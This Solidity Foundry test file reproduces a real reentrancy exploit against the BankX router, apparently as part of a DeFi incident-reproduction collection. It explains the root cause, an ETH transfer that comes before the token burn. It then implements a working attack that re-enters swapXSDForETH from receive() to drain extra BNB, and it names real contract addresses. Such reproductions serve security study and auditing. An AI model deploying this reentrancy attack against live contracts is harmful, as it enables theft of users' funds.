// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~$43K (BSC + ETH + OP)
// Attacker (BSC)  : https://bscscan.com/address/0x867aa2a2667060096d0f108ddfa3367caca9fd34
// Attack Contract : https://bscscan.com/address/0xab50cfdab8484e15fee82852c08eec135ac00e4c
// Router          : https://bscscan.com/address/0xaadae9117df8b5d584378a41a105cc4862a16e99
// XSD/WETH pool   : https://bscscan.com/address/0x8a4e0e2a778df8ce4ea5d5108fffe690cc9ae07a
// XSD             : https://bscscan.com/address/0x39400e67820c88a9d67f4f9c1fbf86f3d688e9f6
// Attack Tx (BSC) : https://bscscan.com/tx/0xe808330b8ddc2f7c6164743c210c9e1975de87c1949c6353d98f2d39e4dde182
// Attack Tx (ETH) : https://etherscan.io/tx/0xcec091760cac239afb912396b53f778a3710d14ab05ca810c285fe31fa70ede6
// Attack Tx (OP)  : https://optimistic.etherscan.io/tx/0xe1a3d0ddce6a075ee424fe0d0b87b465b363c2f26ca855b646296058f89b0c31
//
// @Analysis
// Twitter Guy : https://x.com/TenArmorAlert/status/1888141223094821215
//
// Root cause (Router.swapXSDForETH):
//   1) transfer XSD from user → pool
//   2) pool.swap → router receives WETH
//   3) WETH.withdraw + safeTransferETH(msg.sender)  ← external call BEFORE burn
//   4) XSD.burnpoolXSD(amountInMax/10)
// Reentering at (3) re-swaps against desynced pool state and burns excess XSD.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IRouter {
    function swapXSDForETH(uint256 amountOut, uint256 amountInMax, uint256 deadline) external;
    function XSDWETH_pool_address() external view returns (address);
    function block_delay() external view returns (uint256);
}

interface IPool {
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IPID {
    function priceCheck() external;
}

contract BankX_exp is BaseTestWithBalanceLog {
    address constant ROUTER = 0xaaDAE9117dF8b5d584378a41a105CC4862A16E99;
    address constant XSD = 0x39400E67820c88A9D67F4F9c1fbf86f3D688e9F6;
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant POOL = 0x8A4e0e2A778dF8cE4EA5D5108FFfE690CC9Ae07a;
    address constant PID = 0xF441252DE7972B269cE954d82bE8b127a815Ecfb;

    uint256 constant ATTACK_BLOCK = 46_433_152;
    uint256 constant FORK_BLOCK = ATTACK_BLOCK - 1;

    uint256 reenterCount;
    uint256 constant MAX_REENTER = 3;
    bool attacking;
    uint256 amountOutPrimary = 5 ether;

    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8546", FORK_BLOCK);
        fundingToken = address(0); // track BNB profit
        vm.label(ROUTER, "BankXRouter");
        vm.label(XSD, "XSD");
        vm.label(POOL, "XSDWETH");
        vm.label(PID, "PID");
    }

    function testExploit() public balanceLog {
        // Seed XSD. Live attack used multi-hop funding into the attack contract.
        uint256 seed = 500_000 ether;
        deal(XSD, address(this), seed);
        IERC20(XSD).approve(ROUTER, type(uint256).max);

        (uint112 r0, uint112 r1,) = IPool(POOL).getReserves();
        emit log_named_decimal_uint("reserve XSD", r0, 18);
        emit log_named_decimal_uint("reserve WETH", r1, 18);

        // Satisfy blockDelay: priceCheck + wait block_delay blocks.
        IPID(PID).priceCheck();
        uint256 delay = IRouter(ROUTER).block_delay();
        vm.roll(block.number + delay);
        // Keep timestamp consistent with chain progression.
        vm.warp(block.timestamp + delay * 3);

        uint256 bnbBefore = address(this).balance;
        uint256 xsdBefore = IERC20(XSD).balanceOf(address(this));

        // quote(5 WETH out) ≈ 5 * rXSD / rWETH ≈ 25k+ XSD; use large cap.
        uint256 amountInMax = 200_000 ether;
        attacking = true;
        IRouter(ROUTER).swapXSDForETH(amountOutPrimary, amountInMax, block.timestamp + 100);
        attacking = false;

        uint256 bnbAfter = address(this).balance;
        uint256 xsdAfter = IERC20(XSD).balanceOf(address(this));
        emit log_named_decimal_uint("BNB gained", bnbAfter - bnbBefore, 18);
        emit log_named_decimal_uint("XSD spent", xsdBefore - xsdAfter, 18);
        emit log_named_uint("reenterCount", reenterCount);

        require(reenterCount > 0, "reentrancy did not fire");
        require(bnbAfter - bnbBefore > amountOutPrimary, "did not over-extract BNB via reentrancy");
    }

    receive() external payable {
        if (!attacking || reenterCount >= MAX_REENTER) return;
        reenterCount++;
        // Reenter before outer setPriceCheck(false) runs.
        try IRouter(ROUTER).swapXSDForETH(2 ether, 200_000 ether, block.timestamp + 100) {} catch {}
    }
}
